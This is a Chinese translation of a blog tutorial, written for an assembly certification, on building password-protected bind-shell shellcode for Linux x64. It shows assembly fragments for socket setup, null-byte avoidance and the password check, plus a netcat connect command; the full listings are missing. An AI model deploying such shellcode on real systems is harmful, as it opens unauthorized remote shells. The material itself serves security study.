<html>
<head>
<title>Writing a Password Protected Bind Shell (Linux/x64)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">编写受密码保护的绑定Shell (Linux/x64)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/writing-a-password-protected-bind-shell-linux-x64-e052d2f65ff2?source=collection_archive---------1-----------------------#2019-03-08">https://infosecwriteups.com/writing-a-password-protected-bind-shell-linux-x64-e052d2f65ff2?source=collection_archive---------1-----------------------#2019-03-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/065ce2e0301d2ed5ae68979f21abe9b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*At8oZDIDemt5J_Xc"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">保罗·埃施-洛朗在<a class="ae kc" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><h1 id="cff3" class="kd ke iq bd kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la bi translated">第一阶段:概述</h1><p id="630b" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">首先，我们在这里试图实现什么？我们的目标是为Linux x64架构编写<a class="ae kc" href="https://en.wikipedia.org/wiki/Shellcode" rel="noopener ugc nofollow" target="_blank">外壳代码</a>，它将打开IPv4套接字上的TCP，等待传入的连接，并仅在客户端提供有效密码后执行外壳。</p><p id="dfab" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">为了编写一个常规的绑定shell，我们需要链接几个系统调用。确切的顺序如下(我们稍后将处理身份验证):</p><p id="d8fb" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">1-我们创建一个新的套接字，并使用<strong class="ld ir">套接字</strong>和<strong class="ld ir">绑定</strong>系统调用将其绑定到目标地址</p><p id="49b1" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">2-我们让套接字保持打开，并使用<strong class="ld ir"> listen </strong> syscall等待连接</p><p id="2310" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">3-一旦接收到传入的连接，我们使用<strong class="ld ir"> accept </strong> syscall来建立连接</p><p id="47a8" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">4-我们使用<strong class="ld ir"> dup2 </strong> syscall将每个标准流复制到新的连接流中，这样目标机器就可以从源机器读取和写入消息</p><p id="d12b" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">5-我们通过使用<strong class="ld ir"> execve </strong>系统调用来启动一个shell</p><p id="cb55" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">每个系统调用都有一个我们需要处理的签名。某些寄存器必须包含特定的值。例如，<em class="me"> rax </em>寄存器用于识别所执行的系统调用，因此它应该始终包含系统调用号。包含完整syscall表的整个文档可以在这里找到。</p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mf"><img src="../Images/f880f1e951de72ecdfce9ace058ce62b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*2kkoPF-V4OKYE_GS"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">洛伦佐·埃雷拉在<a class="ae kc" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><h1 id="0c77" class="kd ke iq bd kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la bi translated">第二阶段:编写系统调用</h1><p id="60c5" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">让我们看一个如何执行系统调用的例子</p><h2 id="1439" class="mk ke iq bd kf ml mm dn kj mn mo dp kn lm mp mq kr lq mr ms kv lu mt mu kz mv bi translated">一个简单的系统调用:Socket (0x29)</h2><pre class="mg mh mi mj gt mw mx my mz aw na bi"><span id="9281" class="mk ke iq mx b gy nb nc l nd ne">48c7c029000000 mov rax, 0x29 ; this is the socket syscall number<br/>48c7c702000000 mov rdi, 0x02 ; 0x02 correponds with IPv4<br/>4831f6         xor rsi, rsi<br/>48ffc6         inc rsi      ; 0x01 correponds with TCP<br/>31d2           xor edx, edx ; 0 corresponds with protocol sub-family<br/>0f05           syscall       ; executes the syscall</span></pre><p id="8a6d" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">这段代码有一些问题。首先，它非常长(准确地说是48字节)。第二，它包含大量的空字节。让我们试着解决这个问题！</p><h2 id="0847" class="mk ke iq bd kf ml mm dn kj mn mo dp kn lm mp mq kr lq mr ms kv lu mt mu kz mv bi translated">更现实的方法:套接字(0x29)</h2><p id="1379" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">以下实现的长度为12字节(上一个示例的四分之一)，并且不包含空字节:</p><pre class="mg mh mi mj gt mw mx my mz aw na bi"><span id="fced" class="mk ke iq mx b gy nb nc l nd ne">6a29 push 0x29<br/>58   pop rax    ; sets rax to 0x29 without nullbytes<br/>6a02 push 0x02<br/>5f   pop rdi    ; same technique for rdi<br/>6a01 push 0x01<br/>5e   pop rsi    ; same for rsi<br/>99   cdq        ; setting rdx to 0 using just one byte<br/>0f05 syscall</span></pre><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/8ebaacdf3a0e3fda6069ce6e13a64014.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*Qvr0fKC-B5MbH9CR"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">由<a class="ae kc" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上的<a class="ae kc" href="https://unsplash.com/@1amfcs?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">1 AMCs</a>拍摄的照片</figcaption></figure><h1 id="bf65" class="kd ke iq bd kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la bi translated">第三阶段:编写Bind Shell</h1><p id="5b76" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">有了所有的知识，我们现在需要将每个系统调用链接在一起。以下是一个示例实现，其中添加了旨在阐明该过程每个部分的注释:</p><figure class="mg mh mi mj gt jr"><div class="bz fp l di"><div class="ng nh l"/></div></figure><p id="cfa0" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">我们可以通过组装和链接这个文件，然后提取外壳代码并运行它来检查绑定外壳是否工作。我有一些自定义脚本，通过自动化<a class="ae kc" href="https://github.com/alanvivona/pwnshop/blob/master/utils/asm-and-link" rel="noopener ugc nofollow" target="_blank">组装和链接</a>过程、<a class="ae kc" href="https://github.com/alanvivona/pwnshop/blob/master/utils/obj2shellcode" rel="noopener ugc nofollow" target="_blank">外壳代码提取</a>和<a class="ae kc" href="https://github.com/alanvivona/pwnshop/blob/master/utils/gen-shellcode-test" rel="noopener ugc nofollow" target="_blank">测试框架生成</a>来运行我们的外壳代码，使这个过程变得稍微容易一点。您可能想要检查这些脚本和/或自己使用它们(当然还要报告错误/改进！).</p><p id="610d" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">运行shell代码后，我们应该使用netcat从另一个终端进行连接，发出以下命令，并弹出一个shell:</p><pre class="mg mh mi mj gt mw mx my mz aw na bi"><span id="a41c" class="mk ke iq mx b gy nb nc l nd ne">nc 127.0.0.1 4444</span></pre><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ni"><img src="../Images/81df5790a61cee063954d3709ec364c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*6WRX8AcwgD10x3v-"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">托马斯·詹森在<a class="ae kc" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><h1 id="c61f" class="kd ke iq bd kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la bi translated">第四阶段:添加身份验证</h1><p id="b387" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">为了添加身份验证，我们需要在执行shell之前读取客户机文件描述符，并将输入与密码进行比较。代码应该大致如下所示:</p><pre class="mg mh mi mj gt mw mx my mz aw na bi"><span id="4ce0" class="mk ke iq mx b gy nb nc l nd ne">; 6 - Handle incoming connection</span><span id="3075" class="mk ke iq mx b gy nj nc l nd ne">; 6.1 - Save client fd and close parent fd<br/>mov r9, rax ; store the client socket fd into r9<br/>; this is not mandatory, may be commented out to save some space<br/>push syscalls.close<br/>pop rax ; close parent<br/>syscall</span><span id="b6fb" class="mk ke iq mx b gy nj nc l nd ne">; 6.2 - Read password from the client fd<br/>read_pass:<br/>  mov rax, r14    ; read syscall == 0x00<br/>  mov rdi, r9     ; from client fd<br/>  push 4<br/>  pop rdx         ; rdx = input size<br/>  sub rsp, rdx<br/>  mov rsi, rsp    ; rsi =&gt; buffer<br/>  syscall</span><span id="aaff" class="mk ke iq mx b gy nj nc l nd ne">; 6.3 - Check password<br/>  mov rax, config.password<br/>  mov rdi, rsi<br/>  scasq<br/>jne read_pass</span></pre><p id="51c4" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">基本上，我们从客户机文件描述符中读取，然后将输入与给定的密码进行比较，并重复这个过程，直到成功。</p><p id="0039" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">下面是一个如何使用这种授权机制的示例:</p><div class="nk nl gp gr nm nn"><a href="https://asciinema.org/a/231614" rel="noopener  ugc nofollow" target="_blank"><div class="no ab fo"><div class="np ab nq cl cj nr"><h2 class="bd ir gy z fp ns fr fs nt fu fw ip bi translated">带有身份验证示例连接的TCP绑定外壳</h2><div class="nu l"><h3 class="bd b gy z fp ns fr fs nt fu fw dk translated">由alanvivona录制</h3></div><div class="nv l"><p class="bd b dl z fp ns fr fs nt fu fw dk translated">asciinema.org</p></div></div><div class="nw l"><div class="nx l ny nz oa nw ob jw nn"/></div></div></a></div><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/a57b3f8282c37ab7a403a66bc7609d43.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*TuPzxXrHPA3-I0Ic"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">约翰·佩塔尔库林在<a class="ae kc" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><h1 id="8795" class="kd ke iq bd kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la bi translated">第五阶段:减少有效载荷</h1><p id="ce61" class="pw-post-body-paragraph lb lc iq ld b le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly ij bi translated">在最初的实现中，我们避免了空字节，但是在这之前我并不太关心大小。有效载荷现在的大小是180字节。为了消除空字节并减小指令大小，我使用radare2 rasm2实用程序来比较指令输出。这里有一个简单的例子:</p><pre class="mg mh mi mj gt mw mx my mz aw na bi"><span id="dd2e" class="mk ke iq mx b gy nb nc l nd ne"><strong class="mx ir">rasm2 -a x86 -b 64 "mov rax,29"</strong><br/>48c7c01d000000</span><span id="77e7" class="mk ke iq mx b gy nj nc l nd ne"><strong class="mx ir">rasm2 -a x86 -b 64 “mov al,29”</strong><br/>b01d</span></pre><p id="cb14" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">我在代码中替换了一些常量，以便找到可能的算术指令来替换这些常量。在条件允许的情况下使用了<code class="fe oc od oe mx b">xchg</code>而不是<code class="fe oc od oe mx b">mov reg, reg</code>。我还使用了一些x64寄存器作为重复使用或有问题的值(如0x00和0x10)的常量保存器，这样我就可以加载值，而不必将它们压入堆栈或先执行任何其他算术指令，这样可以节省一些字节。另一个技巧是在情况允许时使用较小的寄存器大小(如r14d、r14w或r14b，而不是整个r14)。最终版本如下所示:</p><figure class="mg mh mi mj gt jr"><div class="bz fp l di"><div class="ng nh l"/></div></figure><p id="2f95" class="pw-post-body-paragraph lb lc iq ld b le lz lg lh li ma lk ll lm mb lo lp lq mc ls lt lu md lw lx ly ij bi translated">这个最后的版本有163字节长。这里可能还有很大的改进空间，所以我很乐意接受建议！</p></div><div class="ab cl of og hu oh" role="separator"><span class="oi bw bk oj ok ol"/><span class="oi bw bk oj ok ol"/><span class="oi bw bk oj ok"/></div><div class="ij ik il im in"><div class="mg mh mi mj gt nn"><a href="https://twitter.com/syscall59" rel="noopener  ugc nofollow" target="_blank"><div class="no ab fo"><div class="np ab nq cl cj nr"><h2 class="bd ir gy z fp ns fr fs nt fu fw ip bi translated">艾伦(@syscall59) |推特</h2><div class="nu l"><h3 class="bd b gy z fp ns fr fs nt fu fw dk translated">艾伦的最新推文(@syscall59)。功能过多的脚本小子</h3></div><div class="nv l"><p class="bd b dl z fp ns fr fs nt fu fw dk translated">twitter.com</p></div></div><div class="nw l"><div class="om l ny nz oa nw ob jw nn"/></div></div></a></div></div><div class="ab cl of og hu oh" role="separator"><span class="oi bw bk oj ok ol"/><span class="oi bw bk oj ok ol"/><span class="oi bw bk oj ok"/></div><div class="ij ik il im in"><blockquote class="on oo op"><p id="2c37" class="lb lc me ld b le lz lg lh li ma lk ll oq mb lo lp or mc ls lt os md lw lx ly ij bi translated">T <em class="iq">他的博文是为了完成</em><a class="ae kc" href="https://www.pentesteracademy.com/course?id=7" rel="noopener ugc nofollow" target="_blank">security tube Linux Assembly Expert certification</a><br/>学生ID:slae 64–1326<br/><a class="ae kc" href="https://github.com/alanvivona/pwnshop/blob/master/src/0x0D-SLAE64-1-tcp-bind-shell-auth/tcp-bind-shell-auth-smaller.nasm" rel="noopener ugc nofollow" target="_blank">最新版本的源代码可以在这里找到</a></p></blockquote></div></div>    
</body>
</html>